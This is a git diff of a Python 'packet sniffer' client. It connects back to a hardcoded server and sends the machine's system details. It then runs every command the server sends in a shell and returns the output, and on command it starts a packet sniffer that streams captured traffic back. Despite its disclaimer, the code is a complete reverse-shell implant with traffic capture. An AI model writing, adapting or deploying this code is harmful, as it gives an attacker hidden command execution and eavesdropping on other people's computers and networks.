@@ -1,37 +1,140 @@
 #Created by Vasto Boy
 
 #Disclaimer: This packet sniffer should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.
-
+import os
 import json
 import time
 import socket
 import datetime
 import platform
 import threading
+import subprocess
 from sniffer import SimpleSniffer
 
 
 
 class SimpleSnifferClient:
 
-    def __init__(self, host, port):
+    def __init__(self, host, port1, port2):
         self.host = host
-        self.port = port
-        self.sock = None
+        self.port1 = port1
+        self.port2 = port2
+        self.sock1 = None
+        self.sock2 = None
+        self.sniffer = SimpleSniffer(self.host)
+
+
+
+    def convert_text_bold_red(self, text):
+            RESET = "\033[0m"
+            BOLD = "\033[1m"
+            COLOR = "\u001b[36m"
+            return f"{BOLD}{COLOR}{text}{RESET}"
 
 
 
     #tries to connect back to the server
     def establish_connection(self):
+
         while True:
             try:
-                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                self.sock.connect((self.host, self.port)) #connect back to server
+                self.sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.sock1.connect((self.host, self.port1)) #connect back to server
                 print("[+]Connected")
+
+                self.sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.sock2.connect((self.host, self.port2)) #connect back to server
+                print("[+]Connected2")
                 break
+
             except socket.error as err:
                 print(err)
                 time.sleep(60) #try to reconnect after 1 minute
+
+        #send system info
+        self.send_system_info()
+
+
+        #create sniffer threads
+        capture_thread = None
+        capture_handle_thread = None
+
+
+
+        # Listen for commands from server
+        while True:
+            cmd = self.sock1.recv(4096).decode()
+
+            if cmd == " ":
+                response = f"{self.convert_text_bold_red('Sniffer: ')}{os.getcwd()}: "
+                self.sock1.send(response.encode())
+
+
+            elif cmd[:2] == 'cd': 
+                try:
+                    os.chdir(cmd[3:])
+                    result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    output = result.stdout.read() + result.stderr.read()
+                    output_data = output.decode()
+
+                    if "The system cannot find the path specified." in output_data:
+                        output_data = "\n"
+
+                    response = f"{output_data}\n{self.convert_text_bold_red('Sniffer: ')}{os.getcwd()}: "
+                    self.sock1.send(response.encode())
+                
+                except (FileNotFoundError, IOError):
+                    error_message = "Directory does not exist!!! \n"
+                    response = f"{error_message}{self.convert_text_bold_red('Sniffer: ')}{os.getcwd()}: "
+                    self.sock1.send(response.encode())
+
+
+            elif cmd == "start sniffer":
+                try:
+                     #create sniffer threads
+                    capture_thread = threading.Thread(target=self.sniffer.main)
+                    capture_handle_thread = threading.Thread(target=self.sniffer.process_captures, args=(self.sock2,))
+
+                    capture_thread.start()
+                    capture_handle_thread.start()
+
+                    response = f"[+]Packet Sniffer has been started!!!\n{self.convert_text_bold_red('Sniffer: ')}{os.getcwd()}: "
+                    self.sock1.send(response.encode())
+                   
+                except Exception as e:
+                    error_message = f"{e} \n"
+                    response = f"{error_message}{self.convert_text_bold_red('Sniffer: ')}{os.getcwd()}: "
+                    self.sock1.send(response.encode())
+
+            elif cmd == "stop sniffer":
+                try:
+                    self.sniffer.stop_thread()
+                    capture_thread.join()
+                    capture_handle_thread.join()
+
+
+                    response = f"[+]Packet Sniffer has stopped!!!\n{self.convert_text_bold_red('Sniffer: ')}{os.getcwd()}: "
+                    self.sock1.send(response.encode())
+
+                    self.sniffer.resume()
+                   
+                except Exception as e:
+                    error_message = f"{e} \n"
+                    response = f"{error_message}{self.convert_text_bold_red('Sniffer: ')}{os.getcwd()}: "
+                    self.sock1.send(response.encode())
+
+            else:
+                try:
+                    terminal_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    stdout, stderr = terminal_output.communicate() # This waits for the command to complete and collects stdout and stderr
+                    terminal_output = stdout + stderr 
+
+                    output_data = terminal_output.decode() + "\n" + self.convert_text_bold_red("Sniffer: ") + os.getcwd() + ": "
+                    self.sock1.send(output_data.encode()) 
+
+                except Exception as e:
+                    error_message = f"{e}\n{self.convert_text_bold_red('Sniffer: ')}{os.getcwd()}: "
+                    self.sock1.send(error_message.encode()) 
 
 
 
@@ -50,41 +153,20 @@ class SimpleSnifferClient:
 
 
 
+    # send client info back to server
     def send_system_info(self):
         system_info = self.get_platform_info()
         system_info_string = json.dumps(system_info)
-        self.sock.send(system_info_string.encode())
+        self.sock1.send(system_info_string.encode())
 
-
-
-    def send_packet_data(self):
-        sniffer = SimpleSniffer()
-
-        # Start the packet capture in a separate thread.
-        capture_thread = threading.Thread(target=sniffer.main)
-        capture_thread.start()
-
-        # Start the file reading in a separate thread.
-        read_thread = threading.Thread(target=sniffer.process_captures, args=(self.sock,))
-        read_thread.start()
-
-
-        capture_thread.join()
-        read_thread.join()
-        
 
 
     def start(self):
         self.establish_connection()
-        self.send_system_info()
-        self.send_packet_data()
 
 
 
 
-sniffer = SimpleSnifferClient("192.168.1.202", 5001)
+sniffer = SimpleSnifferClient("192.168.1.202", 5001, 5002)
 sniffer.start()
-
-
-
 
